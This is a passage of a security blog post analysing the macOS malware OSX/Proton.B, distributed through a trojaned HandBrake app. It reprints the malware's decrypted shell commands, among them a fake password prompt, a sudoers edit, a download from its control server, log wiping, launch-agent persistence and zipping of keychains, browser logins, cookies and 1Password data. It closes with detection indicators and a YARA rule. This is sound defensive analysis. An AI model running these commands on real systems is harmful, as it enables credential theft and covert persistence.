        &nbsp;&nbsp;rax = NSApplicationMain(var_A4, var_A0);<br>
        }<br>
        else {<br>
        &nbsp;&nbsp;rax = <b>exit(0x0);</b><br>
        }<br>
		</span>
		</div>
		<br>
		Once the <span class="n3rdFont">NSApplicationMain</span> method has been invoked, the macOS application runtime will automatically invoke the <span class="n3rdFont">'applicationDidFinishLaunching'</span> delegate method. In <span class="n3rdFont">OSX/Proton.B</span> this method is implemented at <span class="n3rdFont">0x10001ED50</span> This is where the malware continues execution.
		<br>
		<br>
		Here, it starts executing various commands that are embedded in the encrypted <span class="n3rdFont">.hash</span> file. For example it checks if it is connected to the internet by pinging Google's DNS server:
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		nc -G 20 -z 8.8.8.8 53  >/dev/null 2>&amp;1 &amp;&amp; echo success
		</span>
		</div>
		<br>
		It also executes a script, hosted at: <span class="n3rdFont">https://script.google.com/macros/s/<br>AKfycbyd5AcbAnWi2Yn0xhFRbyzS4qMq1VucMVgVvhul5XqS9HkAyJY/exec</span>. This script appears to simply return the current date and time?
		<br><br>
		<span><img src="../images/blog/blog_0x1F/script.png" width="800" style="display:block; margin:auto;"/></span>
		In order to elevate its privileges to root, the malware displays a fake authentication prompt using strings, again from the encrypted <span class="n3rdFont">.hash</span> file (such as "HandBrake needs to install additional codecs. Enter your password to allow this"):
		<br><br>
		<span><img src="../images/blog/blog_0x1D/authPrompt.png" width="400" style="display:block; margin:auto;"/></span>
		<br>
		The class that implements this window is aptly named 'AuthorizationWindow':
		<br><br>
		<span><img src="../images/blog/blog_0x1F/authWindowClass.png" width="450" style="display:block; margin:auto;"/></span>
		<br>
		If the user is tricked into entering their password, the malware 'validates' the credentials via the following:
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		echo 'p@ss0wrd' | sudo -S echo success;
		</span>
		</div>
		<br>
		Once it has obtained root, (thanks to a naive user), the malware executes the following:
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		echo 'printf "\033[8;1;1t"; echo "%@" | sudo -S sh -c "echo 'Defaults !tty_tickets' >> /etc/sudoers"; killall Terminal; sleep 1;' > ~/Library/sco.command; chmod 777 ~/Library/sco.command; open ~/Library/sco.command &amp;&amp; sleep 2.7; rm -rf ~/Library/sco.command;
		</span>
		</div>
		<br>
		As part of this command (<span class="n3rdFont">killall Terminal</span>) will kill all instances of the Terminal (including the one we are using to debug the malware), execute the <span class="n3rdFont">'thread return'</span> command in the debugger on the function at <span class="n3rdFont">0x0000000100014EB0</span>, to skip these commands from being run.
		<br>
		<br>
		Next the malware downloads an RSA key from its command and control server(s) and verifies it via a public key that is embedded within the malware:
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		curl -s --connect-timeout 10 -o /tmp/au https://handbrake.biz/rsa<br>
		<br>
		openssl rsautl -verify -in /tmp/au -pubin -inkey /tmp/au.pub<br>
		</span>
		</div>
		<br>
		Then, it starts pinging its various command and control servers:
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		ping -c 1 <b>handbrake.biz</b> 2>/dev/null >/dev/null &amp;&amp; echo 0<br>
		<br>
		ping -c 1 <b>handbrakestore.com</b> 2>/dev/null >/dev/null &amp;&amp; echo 0<br>
		<br>
		ping -c 1 <b>handbrake.cc</b> 2>/dev/null >/dev/null &amp;&amp; echo 0<br>
		<br>
		...
		</span>
		</div>
		<br>
		During my analysis, the malware didn't appear to be too happy chatting with the various command and control servers. Maybe it doesn't like being this high up :P or more likely these C&amp;C servers are sinkholed this point. As such, I didn't observe the malware executing the other commands found in the encrypted 'tasking' file (<span class="n3rdFont">'.hash'</span>). However, since the commands are simply shell commands that we've decrypted, it's easy to understand the malware's full capabilities.
		<br>
		<br>
		For example, <span class="n3rdFont">OSX/Proton.B</span> has commands to:
		<ul style="list-style-type: square;">
		<li>'complicate' analysis by killing apps such as the <span class="n3rdFont">Console</span>, or <span class="n3rdFont">Wireshark</span> and wiping (some) system logs:
		<br>
		<span class="n3rdFont">killall Console<br>
		killall Wireshark<br>
		<br>
		sudo -S rm -rf /var/log/* /Library/Logs/*</span>
		</li><br>
		<li>persist itself (as a launch agent):<br>
		<span class="n3rdFont">
		sed -i -e 's/P_MBN/%@/g' ~/Library/LaunchAgents/%@.plist; sed -i -e 's=P_UPTH=%@/%@/Contents/MacOS/%@=g' ~/Library/LaunchAgents/%@.plist; chmod 644 ~/Library/LaunchAgents/%@.plist</span>
		</li><br>
		<li>
		collect and exfiltrate sensitive user data such as 1Password files, browser login data, keychains, etc:<br>
		<span class="n3rdFont">
		zip %@/CR.zip ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Login\ Data ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Cookies
		<br>
		<br>
		zip -r %@/KC.zip ~/Library/Keychains/ /Library/Keychains/; %@ %@ %@ %@ zip -r %@/GNU_PW.zip ~/.gnupg ~/Library/Application\ Support/1Password\ 4  ~/Library/Application\ Support/1Password\ 3.9; zip -r %@/proton.zip %@; %@ echo success
		<br>
		<br>
		</li>
		<li>...and much more!</li>
		</ul>
		If you're interested in another solid technical analysis of <span class="n3rdFont">OSX/Proton.B</span>, see: <a class="inlineLink" href="https://www.cybereason.com/labs-proton-b-what-this-mac-malware-actually-does/">"Proton.B: What this Mac malware actually does"</a> (by <a class="inlineLink" href="https://twitter.com/0xamit">0xamit</a>).
		<br>
		<br>
		<span style="color: #95c02d; font-weight: bold;">Conclusions</span><br>
		Well, my flight is about to land! So let's wrap this all up. 
		<br>
		<br>
		In this post we dug into the technical details of how <span class="n3rdFont">OSX/Proton.B</span> is installed via a trojaned HandBrake application. We also uncovered the malware's capabilities, such as its propensity for sensitive user data. Moreover, we answered the question why users with Little Snitch, remained uninfected. Neat! 
		<br>
		<br>
		Again, to check if you're infected, look for the following:
		<br><br>
		<span><img src="../images/blog/blog_0x1D/taskExplorer.png" width="800" style="display:block; margin:auto;"/></span>
		<br>
		<ul style="list-style-type: square;">
		<li>a process named <span class="n3rdFont">'activity_agent'</span>, or <span class="n3rdFont">Handbrake</span> (that's running out of (<span class="n3rdFont">/tmp</span>)</li><br>
		<li>an application name <span class="n3rdFont">'activity_agent.app</span> in <span class="n3rdFont">~/Library/RenderFiles/</span></li><br>
		<li>a plist file: <span class="n3rdFont">'~/Library/LaunchAgents/fr.handbrake.activity_agent.plist</span></li><br>
		</ul>
		If you have been infected - it's best fully reinstall macOS via the 'macOS Recovery OS', and change all your passwords. 
		<br>
		<br>
		As mentioned in the last blog post, Apple has also pushed out an XProtect signature, meaning that all new infections should be thwarted:
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		<br>
		$ cat /System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.yara<br>
		<br>
		private rule Macho<br>
		{<br>
    	&nbsp;&nbsp;meta:<br>
        &nbsp;&nbsp;description = "private rule to match Mach-O binaries"<br>
    	&nbsp;&nbsp;condition:<br>
        &nbsp;&nbsp;uint32(0) == 0xfeedface or uint32(0) == 0xcefaedfe or uint32(0) == 0xfeedfacf<br>
        &nbsp;&nbsp;or uint32(0) == 0xcffaedfe or uint32(0) == 0xcafebabe or uint32(0) == 0xbebafeca<br>
        <br>
		}<br>
		<br>
		rule XProtect_OSX_Proton_B<br>
		{<br>
    	&nbsp;&nbsp;meta:<br>
        &nbsp;&nbsp;description = "OSX.Proton.B"<br>
        <br>
    	&nbsp;&nbsp;condition:<br>
        &nbsp;&nbsp;<b>Macho and filesize &lt; 800000 and hash.sha1(0, filesize) == <br>
        &nbsp;&nbsp;&nbsp;&nbsp;"a8ea82ee767091098b0e275a80d25d3bc79e0cea"</b><br>
		}<br>
		<br>
		</span>
		</div>
		<br>
		Finally, running a security product such as Little Snitch or BlockBlock is a must! 
		<br><br>
		<span><img src="../images/blog/blog_0x1D/blockblock.png" width="800" style="display:block; margin:auto;"/></span>
		<br>
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
		<span class="n3rdFont">
		love these blog posts? support my tools &amp; writing on <a class="inlineLink" href="https://www.patreon.com/objective_see"><span class="n3rdFont">patreon</span></a>! Mahalo :) 
		<br>
		</span>
		</div>
		<br>
		p.s. shout out to all the guys/gals on #macadmins!
		<br>
		<br>
		<br>
		</span>
		</div>
	</section>	
</div>	

<!-- footer, copyright notice and social media icons -->
<nav role="footer">
<ul>
	<li class="copyright">&copy; 2017 objective-see llc</li>
	<li><a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon ss-social">&#x2709;</span></a></li>
	<li><a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon ss-social">&#xF611;</span></a></li>
	<li><a href="../rss.xml" class="menubutton icon"><span class="ss-icon">&#xE310;</span></a></li>
	<li>
        <a href="https://www.patreon.com/bePatron?u=4857001" class="menubutton icon donate" style="font-size: 18px; padding-top: 14px;">donate!</a>
    </li>
</ul>
</nav>

</body>
</html>
